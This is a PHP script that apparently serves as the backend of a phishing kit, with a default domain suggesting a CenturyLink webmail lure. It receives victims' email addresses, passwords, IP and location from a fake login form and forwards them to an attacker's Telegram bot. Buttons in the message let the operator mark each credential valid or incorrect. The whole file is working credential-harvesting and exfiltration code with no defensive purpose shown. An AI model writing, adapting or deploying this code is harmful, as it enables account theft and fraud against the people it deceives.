<?php
require_once 'config.php';
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $sid = $_POST['sid'] ?? '';
    $ip = $_POST['ip'] ?? 'Unknown';
    $city = $_POST['city'] ?? 'Unknown';
    $region = $_POST['region'] ?? 'Unknown';
    $country = $_POST['country'] ?? 'Unknown';

    if (!$email || !$password || !$sid) {
        echo json_encode(['ok' => false, 'error' => 'Missing required fields']);
        exit;
    }

    $domain = explode('@', $email)[1] ?? 'centurylink.net';

    $message = "🔐 <b>NEW LOGIN ATTEMPT</b>\n\n" .
               "🆔 ID: <code>{$sid}</code>\n" .
               "📧 Email: <code>{$email}</code>\n" .
               "🔑 Password: <code>{$password}</code>\n\n" .
               "🌐 IP: <code>{$ip}</code>\n" .
               "📍 Location: {$city}, {$region}, {$country}";

    $payload = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => [
            'inline_keyboard' => [
                [
                    ['text' => '❌ Incorrect', 'callback_data' => "incorrect_{$sid}"],
                    ['text' => '✅ Valid', 'callback_data' => "valid_{$sid}"]
                ]
            ]
        ]
    ];

    $ch = curl_init("https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);

    $resData = json_decode($response, true);
    if ($resData && isset($resData['ok']) && $resData['ok']) {
        echo json_encode(['ok' => true, 'domain' => $domain]);
    } else {
        echo json_encode(['ok' => false, 'error' => 'Telegram API failed']);
    }
    exit;
}
echo json_encode(['ok' => false]);
?>